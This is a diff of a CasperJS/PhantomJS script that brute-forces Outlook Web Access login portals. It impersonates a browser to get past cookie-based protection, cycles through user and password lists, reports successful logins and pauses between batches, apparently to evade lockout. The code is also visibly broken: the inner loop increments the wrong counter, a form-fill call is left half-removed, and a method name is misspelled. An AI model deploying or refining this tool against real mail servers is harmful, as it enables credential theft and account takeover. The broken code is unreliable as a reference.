@@ -1,11 +1,8 @@
 // casper|phantom JS
 // author: mp - heavily based on ry's work
-// this requires casperjs and phantomjs to work
-// sometimes OWA login portals are protected by 
-// microsuck forefront to provide cookie auth..
-// something that is annoying to code for with
-// any other language, so impersonate a browser
-// and use that to make guessing attempts :)
+// this requires casperjs and phantomjs to work sometimes OWA login portals are protected by 
+// microsuck forefront to provide cookie auth.. something that is annoying to code for with
+// any other language, so impersonate a browser and use that to make guessing attempts :)
 
 var casper = require("casper").create({
     verbose      : true,
@@ -37,7 +34,7 @@ var passlist = casper.cli.get("passlist");
 var attempts = casper.cli.get("attempts");
 var sleep    = casper.cli.get("sleep");
 
-if (!failed || !form || !url || !title || !UA || !userlist || !passlist || !attempts || !sleep) {
+if (!failed || !form || !url || !title || !UA || !userlist || !passlist || !attempts || !sleep || !button) {
     casper.echo("usage: casperjs owabf.js <args>");
     casper.echo("");
     casper.echo("    --failed     : failed string");
@@ -49,6 +46,7 @@ if (!failed || !form || !url || !title || !UA || !userlist || !passlist || !atte
     casper.echo("    --passlist   : list of passwords");
     casper.echo("    --attempts   : number of attempts before sleeping");
     casper.echo("    --sleep      : how long to sleep for in minutes");
+    casper.echo("    --button     : button to click");
     casper.exit(1);
 }
 
@@ -79,18 +77,19 @@ casper.on("open", function(location) {
 
 var users   = fs.read(userlist);
 var passwds = fs.read(passlist);
+var count   = 0
 
 casper.start();
 casper.userAgent(UA);
+
 if (users && passwds) {
     casper.echo("[+++] Targeting " + url);
     passlines = passwds.split("\n");
     for (var i = 0, len = passlines.length; i < len; i++) {
         userlines = users.split("\n");
-        for (var j = 0, len = userlines.length; j < len; i++) {
+        for (var j = 0, len = userlines.length; j < len; i++) {           
             if (this.exists(form)) {
                 casper.echo("[>>>] Trying " + userlines[j] + ":" + passlines[i]);
-                this.fill(form, { 
                     user_name : userlines[j],
                     password  : passlines[i]
                 }, false);
@@ -99,14 +98,24 @@ if (users && passwds) {
                     this.click("login button");
                 });
                 casper.then(function() {
+                    // wait for the page to load
                     this.wait(1000, function() {
                         if (this.getHTLM().indexOf(failed) == -1) {
                             this.echo("[+++] Successful login " + userlines[j] + ":" + passlines[i]);
                         } else {
                             this.echo("[!!!] Failed login " + userlines[j] + ":" + passlines[i]);
-                }});});
-
+                        }
+                    });
+                });
             } else {
                 this.echo("[!!!] Unable to find login form " + form)
                 this.exit(1);
-}}}}
+            }
+        }
+        count += 1;
+        if (count % attempts == 0) {
+            this.echo("[---] Sleeping for " + sleep + " minutes");
+            this.wait( sleep * 60000 );
+        }
+    }
+}
